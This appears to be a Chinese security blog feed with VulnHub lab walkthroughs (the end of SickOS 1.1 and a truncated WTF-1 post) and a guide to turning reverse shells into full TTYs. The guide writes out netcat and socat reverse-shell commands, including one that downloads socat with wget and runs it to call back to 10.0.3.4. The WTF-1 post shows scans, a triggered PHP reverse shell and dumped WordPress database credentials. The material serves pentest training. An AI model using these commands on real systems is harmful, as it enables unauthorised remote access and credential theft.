john@123</span><br><span class="line"></span><br><span class="line">root@SickOs:/var/www/wolfcms<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@SickOs:/var/www/wolfcms<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@SickOs:/var/www/wolfcms<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@SickOs:/root<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">a0216ea4d51874464078c618298b1367.txt</span><br><span class="line">root@SickOs:/root<span class="comment"># cat a0216ea4d51874464078c618298b1367.txt</span></span><br><span class="line">cat a0216ea4d51874464078c618298b1367.txt</span><br><span class="line">If you are viewing this!!</span><br><span class="line"></span><br><span class="line">ROOT!</span><br><span class="line"></span><br><span class="line">You have Succesfully completed SickOS1.1.</span><br><span class="line">Thanks <span class="keyword">for</span> Trying</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub227.jpg"></li>
</ul>
<p>到此为止成功获取到了root权限并读取了flag</p>
<h3 id="其它提权方法参考"><a href="#其它提权方法参考" class="headerlink" title="其它提权方法参考"></a>其它提权方法参考</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tpbmdib2JpL2N0Zi13cml0ZXVwL3RyZWUvbWFzdGVyLzIwMTUvc2xpY2tPcy0xLjE=">2015-slickOs-1.1<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNocmlzdG9waGV0ZC5mci93cml0ZS11cC1zaWNrb3MtMS0xLw==">write-up-sickos-1-1<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ppb25zcGlrZS92dWxuaHViLXdyaXRldXAvYmxvYi9tYXN0ZXIvc2ljazBzJTIwMS4xL2thcGktbm90ZS5tZA==">vulnhub-writeup-SickOs-1-1<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>就是利用ShellShock漏洞和自动定时任务提权,很简单，在这里就不多做演示了</p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>浏览器设置http-proxy Squid http proxy代理访问</li>
<li>弱口令</li>
<li>文件上传</li>
<li>用户值为1000:1000-第一用户提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>将simpleshell提升为全交互式的TTYshell</title>
    <url>/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/</url>
    <content><![CDATA[<ul>
<li>每个pentester都知道使用netcat获得反向shell并看到该ID的输出令人非常满意的冗长的netcat消息时，会感到非常惊奇。而且，如果其他渗透测试者像我一样，他们也知道失去shell时会感到害怕，因为运行了一个错误的命令，该命令挂起并意外打到“Ctrl-C”，以为它会停止它，但会kill整个连接。</li>
</ul>
<p><img src="https://blog.ropnop.com/content/images/2017/07/oops_ctrl_c.png"></p>
<p>除了不能正确处理SIGINT之外，这些“哑” shell还具有其他缺点：</p>
<a id="more"></a>

<ul>
<li>某些命令（例如su和ssh）需要正确的终端才能运行</li>
<li>通常不显示STDERR</li>
<li>无法正确使用vim等文本编辑器</li>
<li>没有完整制表符</li>
<li>没有向上箭头的历史记录</li>
<li>无工作控制</li>
<li>等等…</li>
</ul>
<p>长话短说，虽然这些shell非常适合使用，但我宁愿在完全交互式的TTY中操作。</p>
<p>我遇到了一些很好的资源，其中包括用于“升级”这些shell的非常有用的技巧和技术，并且希望在文章中进行编译和共享。还与Pentest Monkey一起，从菲尼亚斯·费舍尔（Phineas Fisher）的录像带和非法活动记录中学习了技巧：</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vSV9aaEZDUzNBUSN0PTI1bTUzcw==">Phineas Fisher Hacks Catalan Police Union Website Pt-1<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2Jsb2cvcG9zdC1leHBsb2l0YXRpb24td2l0aG91dC1hLXR0eQ==">Post-Exploitation Without A TTY<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h4 id="生成reverse-Shell"><a href="#生成reverse-Shell" class="headerlink" title="生成reverse Shell"></a>生成reverse Shell</h4><p>每个人都非常熟悉使用netcat获取反向shell的传统方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.3.4 4444</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>问题是，不是每个服务器都安装了netcat，也不是每个版本的netcat都带有-e选项。</p>
<p>Pentest Monkey的备忘单很棒</p>
<p><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2NoZWF0LXNoZWV0L3NoZWxscy9yZXZlcnNlLXNoZWxsLWNoZWF0LXNoZWV0">Reverse Shell Cheat Sheet<i class="fa fa-external-link-alt"></i></span></p>
<p>概述了几种不同的方法，但是我最喜欢的技术是使用Metasploit的msfvenom为我生成单行命令。<br>Metasploit在“cmd/unix”下有多个payload，可用于生成单线正向或反向shell：</p>
<p><img src="https://blog.ropnop.com/content/images/2017/07/msfvenom_payloads.png"></p>
<p>这些payload中的任何一个都可以与msfvenom一起使用，以列出所需的原始命令（指定LHOST，LPORT或RPORT）。例如，这是一个不需要-e标志的netcat命令：</p>
<p><img src="https://blog.ropnop.com/content/images/2017/07/netcat_shell_cmd.png"></p>
<p>这是一个Perl oneliner，以防未安装netcat的情况：</p>
<p><img src="https://blog.ropnop.com/content/images/2017/07/perl_shell_cmd.png"></p>
<p>这些都可以通过使用netcat并监听指定的端口（4444）来捕获。</p>
<h3 id="方法1：Python-pty模块"><a href="#方法1：Python-pty模块" class="headerlink" title="方法1：Python pty模块"></a>方法1：Python pty模块</h3><p>捕获一个笨拙的shell之后，很长一段时间以来一直使用的命令之一就是使用Python生成一个pty。<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L3B0eS5odG1s">pty模块<i class="fa fa-external-link-alt"></i></span>产生一个psuedo-terminal，它可以使su之类的命令误认为它们是在适当的终端中执行的。要升级哑shell，只需运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>例如，这将使您运行su（除了为您提供更好的提示之外）</p>
<p><img src="https://blog.ropnop.com/content/images/2017/07/python_pty.png"></p>
<p>不幸的是，这不能解决上面概述的其他一些问题。SIGINT（Ctrl-C）仍将关闭Netcat，并且没有制表符完成或历史记录。但这是一个快速而又肮脏的解决方法，已为提供了无数次帮助。</p>
<h3 id="方法2：使用socat"><a href="#方法2：使用socat" class="headerlink" title="方法2：使用socat"></a>方法2：使用socat</h3><p><span class="exturl" data-url="aHR0cDovL3d3dy5kZXN0LXVucmVhY2gub3JnL3NvY2F0L2RvYy9zb2NhdC5odG1s">socat<i class="fa fa-external-link-alt"></i></span>就像类固醇上的netcat一样，是一种非常强大的网络瑞士军刀。Socat可用于通过TCP连接传递完整的TTY。</p>
<p>如果在受害者服务器上安装了socat，则可以使用它启动reverse shell。还必须抓住与socat的连接才能获得全部功能。</p>
<p>以下命令将产生完全交互式的TTY reverse shell：</p>
<p>On Kali (listen):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>

<p>On Victim (launch):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>

<p>如果未安装socat，那么您的运气还不错。有一些独立的二进制文件可以从这个很棒的Github存储库中下载：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FuZHJldy1kL3N0YXRpYy1iaW5hcmllcw==">https://github.com/andrew-d/static-binaries<i class="fa fa-external-link-alt"></i></span></p>
<p>使用命令注入漏洞，可以将正确的体系结构socat二进制文件下载到可写的Directoy，对其进行chmod，然后在一行中执行reverse shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -q https://github.com/andrew<span class="_">-d</span>/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>

<p>在Kali上，您将获得一个完全交互式的TTY会话。它支持制表符补全，SIGINT/SIGSTP支持,vim,向上箭头历史记录等。它是一个完整的终端。很甜.</p>
<p><img src="https://blog.ropnop.com/content/images/2017/07/socat_tty.png"></p>
<h3 id="方法3：使用magic从netcat升级"><a href="#方法3：使用magic从netcat升级" class="headerlink" title="方法3：使用magic从netcat升级"></a>方法3：使用magic从netcat升级</h3><p>我看到菲尼亚斯·费舍尔（Phineas Fisher）在他的黑客视频中使用了这种技术，感觉就像魔术一样。基本上，可以通过在您的Kali终端中设置一些stty选项来使用哑的netcat shell升级到完整的TTY。首先，遵循与方法1中相同的技术，并使用Python生成PTY。一旦bash在PTY中运行，请使用Ctrl-Z后台shell</p>
<p><img src="https://blog.ropnop.com/content/images/2017/07/background_netcat.png"></p>
<p>当shell处于后台时，现在检查当前的终端和STTY信息，以便可以强制连接的shell匹配它：</p>
<p><img src="https://blog.ropnop.com/content/images/2017/07/term_stty_info.png"></p>
<p>所需的信息是TERM类型（“ xterm-256color”）和当前TTY的大小（“行38；列116”）在shell仍然处于背景中的情况下，现在将当前的STTY设置为raw类型，并使用以下命令告诉它回显输入的字符：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stty raw -<span class="built_in">echo</span></span><br></pre></td></tr></table></figure>

<p>具有原始风格，输入/输出看起来很奇怪，您不会看到下一个命令，但是当您键入它们时，它们正在被处理。接下来用fg前置shell。它将重新打开reverse shell，但是格式将关闭。最后，使用重置重新初始化终端。</p>
<p><img src="https://blog.ropnop.com/content/images/2017/07/fg_reset.png"></p>
<p>注意：我没有再次键入nc命令（如上图所示）。我实际上输入了fg，但是没有回显。nc命令是现在处于前台的作业。然后将reset命令输入到netcat shell中</p>
<p>重置后，shell应再次看起来正常。最后一步是设置shell，终端类型和样式大小以匹配当前的Kali窗口（来自上面收集的信息）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> SHELL=bash</span><br><span class="line"><span class="built_in">export</span> TERM=xterm256-color</span><br><span class="line">stty rows 38 columns 116</span><br></pre></td></tr></table></figure>

<p>最终结果是一个完全交互式的TTY，它通过netcat连接具有我们期望的所有功能（选项卡完成，历史记录，作业控制等）：</p>
<p><img src="https://blog.ropnop.com/content/images/2017/07/netcat_full_tty.png"></p>
<p>现在的可能性是无止境的。在netcat shell上的Tmux？为什么不？：D</p>
<p><img src="https://blog.ropnop.com/content/images/2017/07/tmux_over_netcat-1.png"></p>
<h3 id="tl-dr速查表"><a href="#tl-dr速查表" class="headerlink" title="tl; dr速查表"></a>tl; dr速查表</h3><p>备忘单命令：</p>
<ul>
<li>使用Python作为伪终端</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>使用socat</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Listener:</span></span><br><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br><span class="line"></span><br><span class="line"><span class="comment">#Victim:</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  </span><br></pre></td></tr></table></figure>

<ul>
<li>使用样式选项</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line"><span class="comment"># In Kali</span></span><br><span class="line">$ stty raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ stty rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure>

<p>Enjoy!</p>
]]></content>
      <categories>
        <category>linux提权</category>
        <category>reverse tty shell</category>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>linux提权</tag>
        <tag>reverse tty shell</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[WTF-1]</title>
    <url>/2019/12/24/WTF-1/</url>
    <content><![CDATA[<p>名称：WTF：1<br>发布日期：2019年11月22日</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9tZWdhLm56LyMhZG1aR0RRUmEhZWlVUU5fd19xWk9EbG9ud2U4Uk01V3NPSEZycGkzd3FJeUZmVmMyRHlVMA==">https://mega.nz/#!dmZGDQRa!eiUQN_w_qZODlonwe8RM5WsOHFrpi3wqIyFfVc2DyU0<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93dGYvd3RmLnJhcg==">https://download.vulnhub.com/wtf/wtf.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93dGYvd3RmLnJhci50b3JyZW50">https://download.vulnhub.com/wtf/wtf.rar.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：<br>初学者-中级机器，您的目标是获取/root/flag.txt。<br>记住,很好的列举！基于VMware,您可能会遇到VB问题。</p>
<a id="more"></a>

<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>一开始安装虚拟机打开的时候会遇到描述中所说的获取不到ip的现象参考文章<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTE4NzcxL2FydGljbGUvZGV0YWlscy8xMDM2MzY4OTA=">Vulnhub靶机检测不到IP地址<i class="fa fa-external-link-alt"></i></span>，这篇文章写的很详细，不用我多说，自己看着一步步配置就行。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.134</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 00:0C:29:CA:25:F7 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sS -sV -T5 -A -p- -v --script=vuln 192.168.142.134</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.4.38: </span></span><br><span class="line"><span class="string">|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211</span></span><br><span class="line"><span class="string">|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082</span></span><br><span class="line"><span class="string">|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097</span></span><br><span class="line"><span class="string">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span></span><br><span class="line"><span class="string">|       CVE-2019-0215   6.0     https://vulners.com/cve/CVE-2019-0215</span></span><br><span class="line"><span class="string">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span></span><br><span class="line"><span class="string">|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081</span></span><br><span class="line"><span class="string">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span></span><br><span class="line"><span class="string">|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196</span></span><br><span class="line"><span class="string">|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197</span></span><br><span class="line"><span class="string">|_      CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span></span><br></pre></td></tr></table></figure>

<p>开了22和80两个端口</p>
<p>下载github上评分22.1k的seclists字典</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># apt -y install seclists</span></span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树       </span><br><span class="line">正在读取状态信息... 完成       </span><br><span class="line">下列软件包是自动安装的并且现在不需要了：</span><br><span class="line">  apt-file <span class="built_in">command</span>-not-found libapt-pkg-perl libexporter-tiny-perl libisl21 libjim0.77</span><br><span class="line">  liblist-moreutils-perl libregexp-assemble-perl</span><br><span class="line">使用<span class="string">&#x27;apt autoremove&#x27;</span>来卸载它(它们)。</span><br><span class="line">下列【新】软件包将被安装：</span><br><span class="line">  seclists</span><br><span class="line">升级了 0 个软件包，新安装了 1 个软件包，要卸载 0 个软件包，有 0 个软件包未被升级。</span><br><span class="line">需要下载 276 MB 的归档。</span><br><span class="line">解压缩后会消耗 1,033 MB 的额外空间。</span><br><span class="line">获取:1 https://mirrors.ustc.edu.cn/kali kali-rolling/main amd64 seclists all 2019.4-0kali2 [276 MB]</span><br><span class="line">已下载 276 MB，耗时 45秒 (6,170 kB/s)                                                                 </span><br><span class="line">正在选中未选择的软件包 seclists。</span><br><span class="line">(正在读取数据库 ... 系统当前共安装有 318480 个文件和目录。)</span><br><span class="line">准备解压 .../seclists_2019.4-0kali2_all.deb  ...</span><br><span class="line">正在解压 seclists (2019.4-0kali2) ...</span><br><span class="line">正在设置 seclists (2019.4-0kali2) ...</span><br></pre></td></tr></table></figure>
<p>gobuster扫一波发现zhkh目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># gobuster dir --url http://192.168.142.134/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.142.134/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2019/12/24 00:34:22 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/javascript (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">[ERROR] 2019/12/24 00:34:24 [!] parse http://192.168.142.134/error_log: net/url: invalid control character <span class="keyword">in</span> URL</span><br><span class="line">/zhkh (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2019/12/24 00:34:27 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<p>访问<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEzNC96aGtoLyVFNSU4RiU5MSVFNyU4RSVCMCVFNiU5OCVBRndvcmRwcmVzczUuMyVFNyU4OSU4OCVFNiU5QyVBQyVFNyVBOCU4QiVFNSVCQSU4RiVFNiU5MCVBRCVFNSVCQiVCQSVFNyU5QSU4NA==">http://192.168.142.134/zhkh/发现是wordpress5.3版本程序搭建的<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub87.jpg"></p>
<p>burp添加规则如下图所示即可访问完整的正常页面</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub89.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub88.jpg"></p>
<p>爆破后台密码和寻找wordpress漏洞无果之后下一步操作</p>
<p>由于提示good enumeration,进入wp-content/uploads/目录下有新发现shell.php</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub90.jpg"></p>
<p>访问shell.php出现错误提示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) </span><br></pre></td></tr></table></figure>

<p>看错误得知是php-reverse-shell，就是反弹shell的php木马</p>
<p>用wireshark抓包查看php-reverse-shell请求的ip和端口以便于nc后续本地监听需要</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub91.jpg"></p>
<p>得知请求ip为192.168.1.14，端口为5555</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>NAT模式的网络配置改成192.168.1.0/24，之后给kali配置一个静态IP 192.168.1.14，然后重启kali和wtf靶机，访问php-reverse-shell</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub92.jpg"></p>
<p>成功弹回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5555</span></span><br><span class="line">listening on [any] 5555 ...</span><br><span class="line">192.168.1.15: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.1.14] from (UNKNOWN) [192.168.1.15] 47192</span><br><span class="line">Linux wtf 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux</span></span><br><span class="line"> 01:56:54 up 1 min,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python3 -c &#x27;</span>import pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">www-data@wtf:/$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">bin   home            lib32       media  root  sys  vmlinuz</span></span><br><span class="line"><span class="string">boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old</span></span><br><span class="line"><span class="string">dev   initrd.img.old  libx32      opt    sbin  usr</span></span><br><span class="line"><span class="string">etc   lib             lost+found  proc   srv   var</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看SUID权限可执行文件，没有可用的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@wtf:/$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>

<p>sudo -l又需要输入密码</p>
<p>进入/var/www/html/zhkh目录查看wp-config.php文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@wtf:/var/www/html/zhkh$ cat wp-config.php</span><br><span class="line">cat wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wp_database<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>ra<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>912391929129<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL hostname */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_CHARSET<span class="string">&#x27;, &#x27;</span>utf8mb4<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** The Database Collate type. Don&#x27;</span>t change this <span class="keyword">if</span> <span class="keyword">in</span> doubt. */</span><br><span class="line">define( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@+</span></span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point <span class="keyword">in</span> time to invalidate all existing cookies. This will force all users to have to <span class="built_in">log</span> <span class="keyword">in</span> again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;hmdNSrpLV5we) E$0_/E,$Vxr0%&lt;S&#123;]D@)T+rc%a7wvbr)Q|bm7boJdOz/AN&gt;/#&amp;&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;DR&amp;l3&gt;0z8mmFT+Y&#125;#bqND_~H;wb[r|:te+tN%:K 